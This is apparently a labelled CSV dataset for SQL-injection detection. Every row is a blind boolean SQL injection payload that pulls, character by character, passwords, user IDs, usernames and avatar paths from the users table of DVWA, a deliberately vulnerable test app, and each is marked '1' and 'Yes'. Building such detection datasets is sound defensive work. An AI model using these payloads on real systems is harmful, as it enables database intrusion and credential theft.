input_text,Label,classification, ,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),31,1))>98-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),32,1))>96-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),32,1))>48-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),32,1))>72-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),32,1))>60-- kbvC",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),32,1))>54-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),32,1))>57-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),32,1))>55-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),33,1))>47-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),33,1))>1-- kbvC",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>64-- eWEU",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>32-- eWEU",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>48-- eWEU",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>56-- eWEU",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>52-- eWEU",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>50-- eWEU",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),1,1))>51-- eWEU",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),2,1))>47-- eWEU",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(user_id AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),2,1))>1-- eWEU",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>64-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>96-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>112-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>120-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>116-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>114-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>115-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>96-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>112-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>104-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>108-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>110-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>109-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>96-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>112-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>104-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>108-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>106-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>105-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>96-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>112-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>120-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>116-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>114-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>115-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>96-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>112-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>104-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>100-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>102-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>103-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>96-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>112-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>120-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>124-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>122-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>121-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>96-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>48-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>1-- zBVI",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>64-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>104-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>100-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>102-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),1,1))>103-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>120-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>116-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>114-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),2,1))>115-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>120-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>116-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>114-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),3,1))>115-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>104-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>108-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>110-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),4,1))>111-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>48-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>72-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>60-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>54-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>57-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),5,1))>58-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>64-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>32-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>48-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>40-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>44-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>46-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>47-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>64-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>32-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>48-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>40-- pYOG",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>44-- pYOG",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>46-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>47-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),8,1))>64-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),8,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),8,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),8,1))>104-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),8,1))>108-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),8,1))>106-- pYOG",1,Yes,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),8,1))>107-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),9,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),9,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),9,1))>104-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),9,1))>108-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),9,1))>110-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),9,1))>111-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),10,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),10,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),10,1))>104-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),10,1))>100-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),10,1))>98-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),10,1))>99-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),11,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),11,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),11,1))>104-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),11,1))>100-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),11,1))>98-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),11,1))>97-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),12,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),12,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),12,1))>104-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),12,1))>108-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),12,1))>106-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),12,1))>107-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),13,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),13,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),13,1))>104-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),13,1))>100-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),13,1))>102-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),13,1))>103-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),14,1))>96-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),14,1))>112-- pYOG",1,Yes.,,,,,,,
"2' AND ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),14,1))>104-- pYOG",1,Yes.,,,,,,,
